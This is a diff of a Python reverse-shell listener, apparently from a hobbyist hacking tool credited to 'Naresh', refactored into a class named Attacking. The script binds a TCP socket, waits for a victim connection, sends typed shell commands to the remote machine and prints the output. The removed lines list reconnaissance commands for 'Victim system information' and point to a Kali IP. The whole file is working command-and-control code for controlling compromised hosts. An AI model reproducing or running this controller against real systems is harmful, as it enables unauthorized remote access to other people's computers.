@@ -1,114 +1,109 @@
-#!usr/bin/env python3
+#!/usr/bin/env python3
 
 import socket
-import os
+import signal
+import sys
 
+class Attacking:
 
-def clear():	# Screen clear functio
-     
-     os_name = os.name
+    BOLD = '\033[1m'                # Bold font
+    RESET = '\033[0m'               # Reset all
+    BRIGHT_RED = '\033[91m'         # Red Color
+    BRIGHT_GREEN = '\033[92m'       # Green Color
+    BRIGHT_MAGENTA = '\033[95m'     # Magenta Color
+    BRIGHT_CYAN = '\033[96m'        # Cyan Color
 
-     if os_name == "nt":
-          os.system("cls")
-     else:
-          os.system("clear")
-clear()
+    banner = f"""{BRIGHT_GREEN}{BOLD}
 
-#   Color pattern Ansi code
-RED = '\033[31m'        # RED coloR
-GREEN = '\033[32m'      # GREEN color
-BOLD = '\033[1m'        # Bold font
-RESET = '\033[0m'       # Reset all
+                                                            (       )     (    (     
+                                                            )\ ) ( /(     )\ ) )\ )  
+                (     (   )     (  (        (           (   (()/( )\())(  (()/((()/(  
+                )(   ))\ /((   ))\ )(  (   ))\ ___`  )  )\ ) /(_)((_)\ )\  /(_))/(_)) 
+                (()\ /((_(_))\ /((_(()\ )\ /((_|___/(/( (()/((_))  _((_((_)(_)) (_))   
+                ((_(_)) _)((_(_))  ((_((_(_))    ((_)_\ )(_)/ __|| || | __| |  | |    
+                | '_/ -_)\ V // -_)| '_(_-/ -_)   | '_ \| || \__ \| __ | _|| |__| |__  
+                |_| \___| \_/ \___||_| /__\___|   | .__/ \_, |___/|_||_|___|____|____| 
+                                                |_|    |__/                           
 
+                                                Author  : Naresh
+                                                Github  : https://github.com/theNareshofficial
+                                                Youtube : https://www.youtube.com/@nareshtechweb930
 
-banner = f"""{GREEN}{BOLD}
+    {RESET}
+    """
 
-                                              (       )     (    (     
-                                              )\ ) ( /(     )\ ) )\ )  
- (     (   )     (  (        (           (   (()/( )\())(  (()/((()/(  
- )(   ))\ /((   ))\ )(  (   ))\ ___`  )  )\ ) /(_)((_)\ )\  /(_))/(_)) 
-(()\ /((_(_))\ /((_(()\ )\ /((_|___/(/( (()/((_))  _((_((_)(_)) (_))   
- ((_(_)) _)((_(_))  ((_((_(_))    ((_)_\ )(_)/ __|| || | __| |  | |    
-| '_/ -_)\ V // -_)| '_(_-/ -_)   | '_ \| || \__ \| __ | _|| |__| |__  
-|_| \___| \_/ \___||_| /__\___|   | .__/ \_, |___/|_||_|___|____|____| 
-                                  |_|    |__/                           
+    def __init__(self):
+        self.sock = None
 
-                                  Author  : Naresh
-                                  Github  : https://github.com/theNareshofficial
-                                  Youtube : https://www.youtube.com/@nareshtechweb930
+    def create_socket(self):
+        print(f"{self.BRIGHT_MAGENTA}[~] {self.BRIGHT_CYAN}Creating Socket{self.RESET}")
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            print(f"{self.BRIGHT_MAGENTA}[+]{self.BRIGHT_CYAN} Socket Created{self.RESET}")
+        except Exception as sock_error:
+            print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_RED} Socket Error: {sock_error}{self.RESET}")
+            self.sock = None
 
+    def start_server(self, host="127.0.0.1", port=8080):
+        if self.sock is None:
+            print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_CYAN} No socket available{self.RESET}")
+            return
+        
+        try:
+            print(f"{self.BRIGHT_MAGENTA}[~]{self.BRIGHT_CYAN} Binding to {host}:{port}{self.RESET}")
+            self.sock.bind((host, port))
+            print(f"{self.BRIGHT_MAGENTA}[+]{self.BRIGHT_CYAN} Socket Bound{self.RESET}")
+        except Exception as bind_error:
+            print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_RED} Bind Error: {bind_error} {host} : {port} {self.RESET}")
+            self.close_socket()
+            return
+ 
+        try:
+            print(f"{self.BRIGHT_MAGENTA}[~]{self.BRIGHT_CYAN} Listening on {host}:{port}{self.RESET}")
+            self.sock.listen(5)
+            print(f"{self.BRIGHT_MAGENTA}[+]{self.BRIGHT_CYAN} Listening...{self.RESET}")
+        except Exception as listen_error:
+            print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_RED} Listen Error: {listen_error}{self.RESET}")
+            self.close_socket()
+            return
 
-{RESET}
-"""
+        try:
+            print(f"{self.BRIGHT_MAGENTA}[~]{self.BRIGHT_CYAN} Waiting for connections on {host}:{port}{self.RESET}")
+            conn, addr = self.sock.accept()
+            print(f"{self.BRIGHT_MAGENTA}[+]{self.BRIGHT_CYAN} We got a connection from {addr}{self.RESET}")
 
-print(f"{banner}")
+            while True:
+                command = input(f"{self.BRIGHT_GREEN}{addr[0]}:shell>>> ").strip()
+                if command.lower() == "exit":
+                    print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_RED} Closing connection and exiting...{self.RESET}")
+                    conn.send(b"exit")
+                    break
+                else:
+                    conn.send(command.encode())
+                    response = conn.recv(1024)
+                    print(response.decode())
+        
+        except Exception as connect_error:
+            print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_RED} Connection Error: {connect_error}{self.RESET}")
+        
+        finally:
+            if conn:
+                conn.close()
+            self.close_socket()
 
-# Showing what commands are all you use in shell
-info = """  
+    def close_socket(self):
+        if self.sock:
+            self.sock.close()
+            print(f"{self.BRIGHT_MAGENTA}[~]{self.BRIGHT_RED} Socket Closed{self.RESET}")
 
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-
-                        SHELL COMMANDS
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-
-
-pwd                                 print working directory
-terminate                           Exit from shell
-systeminfo                          Victim system information
-ls, dir                             list Directory
-hostname                            Domain name
-whoami                              User name
-ipconfig                            Show IP address
-ping <ip>                           Ping iP address
-wmic bios get serial number         System serialnumber
-tasklist                            Taskmanger
-netstat                             Port IP connection
-
-
-"""
-
-ip_addr = "Your Kali IP"         # use your kali IP address
-port = 8080                      # use any port
-
-
-def connect():      # Create and connect with target machine
-            
-            try:
-                 
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.bind((ip_addr, port))
-                s.listen(1)
-
-                print(f"{RED}[!] Listening TCP connection from PORT 8080")
-
-                conn, addr = s.accept()
-
-                print(f"{GREEN}[+] We got a connection from : ", addr)
-            
-                while True:
-
-                    command = input("SHELL>>>").encode()
-
-                    if b"terminate" in command:
-                        conn.send(b"terminate")
-                        conn.close()
-                        break
-                    if b"INFO" in command.upper():
-                        conn.send(b"info")
-                        print(info)
-                    else:
-                        conn.send(command)
-                        response = conn.recv(1024)
-                        print(response.decode())
-
-            except Exception as e:
-                 print(f"{RED}COnnection Error : ",e)
-            except KeyboardInterrupt:
-                 pass
-
-def main():
-    connect()
+    def signal_handler(self, sig, frame):
+        print(f"\n{self.BRIGHT_MAGENTA}[~]{self.BRIGHT_RED} Interrupt received, closing socket and exiting...{self.RESET}")
+        self.close_socket()
+        sys.exit(0)
 
 if __name__ == "__main__":
-    main()
-    
-
-
+    attack_instance = Attacking()
+    print(attack_instance.banner)
+    signal.signal(signal.SIGINT, attack_instance.signal_handler)
+    attack_instance.create_socket()
+    attack_instance.start_server()
